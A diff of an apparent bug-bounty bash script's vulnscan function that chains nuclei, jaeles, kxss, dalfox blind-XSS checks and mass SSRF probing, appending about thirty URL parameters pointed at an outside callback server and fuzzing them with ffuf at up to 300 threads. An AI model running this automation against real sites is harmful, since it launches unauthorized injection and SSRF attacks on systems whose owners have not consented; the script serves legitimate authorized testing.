@@ -56,7 +56,7 @@ vulnscan()
 #  mkdir ../vulns/jaeles_result
  # jaeles scan -U "$domain"_unique.txt -c 150 -L 2 -o ../vulns/jaeles_result -s "/root/.jaeles/base-signatures/all/.*"
 #Nuclei Scanner
-#  nuclei -c 200 -l "$domain"_unique.txt -silent -t all/ -o ../vulns/nuclei_result.txt
+  nuclei -c 200 -l "$domain"_unique.txt -silent -t all/ -o ../vulns/nuclei_result.txt
 #XSS parameter scanning
   cd ../URLs/
   cat clean_url.txt | grep "=" | kxss | tee -a ../vulns/xss_reflection_kxss.txt
@@ -65,24 +65,26 @@ vulnscan()
   cd ../vulns/
   if [ -s xss_reflection_kxss.txt ]
   then
-	cat xss_reflection_kxss.txt | dalfox pipe -blind "https://unstable.xss.ht" -o ../vulns/dalfox_result.txt -w 30
+	cat xss_reflection_kxss.txt | dalfox pipe -blind "put your blind xss domain inside quotes" -o ../vulns/dalfox_result.txt -w 30
   else
-	echo -e "\e[92m[~] Some error or no reflection has been found..rerun kxss module manually.."
+	echo -e "\e[92m[~] No reflections has been found.."
   fi
 
 #Hidden parameter discovery
   cp ../subdomains/"$domain"_unique.txt /root/scripts/bounty/Arjun/
   cd /root/scripts/bounty/Arjun/
-  python3 arjun.py --urls "$domain"_unique.txt --get -t 100 -o arjun_result.json
+  python3 arjun.py --urls "$domain"_unique.txt --get -t 50 -o arjun_result.json
   mv arjun_result.json "$current"/"$domain"/"$subdirectory"/URLs/
 
 #gf-patterns and separate files with repect to vulnerabilities
 #SSRF
-  ss=http://ssrftest.com/x/kVTj1
+  ss="put your ssrf server without quotes"            #ssrftest.com or ngrok or burp private collaborator
   cd "$current"/"$domain"/"$subdirectory"/URLs/
   cat clean_url.txt spider_clean_1.txt spider_clean_2.txt | grep "=" | gf ssrf | tee -a ../vulns/possible_ssrf.txt
-  cat ../vulns/possible_ssrf.txt | sed 's|$|\&dest="$ss"\&redirect="$ss"\&uri="$ss"\&path="$ss"\&continue="$ss"\&url="$ss"\&window="$ss"\&next="$ss"\&data="$ss"\&reference="$ss"\&site="$ss"\&html="$ss"\&val="$ss"\&validate="$ss"\&domain="$ss"\&callback="$ss"\&return="$ss"\&page="$ss"\&feed="$ss"\&host="$ss"&\port="$ss"\&to="$ss"\&out="$ss"\&view="$ss"\&dir="$ss"\&show="$ss"\&navigation="$ss"\&open="$ss"|g' | tee -a ../vulns/possible_ssrf_2.txt
-  ffuf -w ../vulns/possible_ssrf_2.txt -u FUZZ -t 100
+  cat ../vulns/possible_ssrf.txt | sed "s|$|\&dest=$ss\&redirect=$ss\&uri=$ss\&path=$ss\&continue=$ss\&url=$ss\&window=$ss\&next=$ss\&data=$ss\&reference=$ss\&site=$ss\&html=$ss\&val=$ss\&validate=$ss\&domain=$ss\&callback=$ss\&return=$ss\&page=$ss\&feed=$ss\&host=$ss&\port=$ss\&to=$ss\&out=$ss\&view=$ss\&dir=$ss\&show=$ss\&navigation=$ss\&open=$ss|g" | tee -a ../vulns/possible_ssrf_2.txt
+  cat clean_url.txt spider_clean_1.txt spider_clean_2.txt | sed "s|$|\&dest=$ss\&redirect=$ss\&uri=$ss\&path=$ss\&continue=$ss\&url=$ss\&window=$ss\&next=$ss\&data=$ss\&reference=$ss\&site=$ss\&html=$ss\&val=$ss\&validate=$ss\&domain=$ss\&callback=$ss\&return=$ss\&page=$ss\&feed=$ss\&host=$ss&\port=$ss\&to=$ss\&out=$ss\&view=$ss\&dir=$ss\&show=$ss\&navigation=$ss\&open=$ss|g" | tee -a ../vulns/possible_ssrf_3.txt
+  ffuf -w ../vulns/possible_ssrf_2.txt -u FUZZ -t 100 -of html -o ../vulns/ssrf_2_result_ffuf.html
+  ffuf -w ../vulns/possible_ssrf_3.txt -u FUZZ -t 300 -of html -o ../vulns/ssrf_3_result_ffuf.html
 #IDOR
   cat clean_url.txt spider_clean_1.txt spider_clean_2.txt | grep "=" | gf idor | tee -a ../vulns/possible_idor.txt
 #SSTI
@@ -117,7 +119,9 @@ vulnscan()
   else
         echo -e "\e[92m[~] No patterns found for sqli.."
   fi
-
+#Jaeles Scanner
+  mkdir ../vulns/jaeles_result
+  jaeles scan -U "$domain"_unique.txt -c 150 -L 2 -o ../vulns/jaeles_result -s "/root/.jaeles/base-signatures/all/.*"
 }
 
 spider()
